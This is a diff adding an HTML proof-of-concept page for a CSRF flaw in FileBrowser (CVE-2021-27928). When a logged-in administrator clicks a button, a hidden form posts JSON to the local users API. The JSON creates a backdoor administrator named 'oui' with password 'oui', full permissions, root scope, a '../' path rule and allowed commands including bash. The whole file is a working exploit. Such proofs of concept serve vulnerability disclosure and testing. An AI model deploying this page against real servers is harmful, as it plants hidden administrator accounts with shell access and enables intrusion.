@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+   <body style="text-align: center;">
+   <h1>CVE-2021-27928 - FileBrowser CSRF Proof of Concept </h1>
+   <!--
+       This create an admin privileged backdoor user named "oui" with password "oui".
+            - The scope is set to the root directory of the server ("/")
+            - All permissions are set to true
+            - Some commands can be executed, you can add new ones - they have to be explicitly written
+    -->
+     <form id="poc" action="http://127.0.0.1:8080/api/users" method="POST" enctype="text/plain">
+       <input type="hidden" name='
+       {
+           "what": "user",
+           "which": [],
+           "data": {
+               "scope": "/",
+               "locale": "en",
+               "viewMode": "mosaic",
+               "singleClick": false,
+               "sorting": {
+                   "by": "",
+                   "asc":false
+                },
+                "perm": {
+                    "admin": true,
+                    "execute": true,
+                    "create": true,
+                    "rename": true,
+                    "modify": true,
+                    "delete": true,
+                    "share": true,
+                    "download": true
+                },
+                "commands": ["ls", "cd", "ps", "whoami", "bash"],
+                "hideDotfiles": false,
+                "username": "oui",
+                "rules": [
+                    {
+                        "allow": true,
+                        "path": "../",
+                        "regex": false,
+                        "regexp": {
+                            "raw": ""
+                        }
+                    }
+                ],
+                "lockPassword": false,
+                "id": 0,
+                "password": "oui"
+            }
+        }' value='test'>
+     </form>
+     <button form="poc">Click me to create a backdoor user!</button>
+   </body>
+ </html>
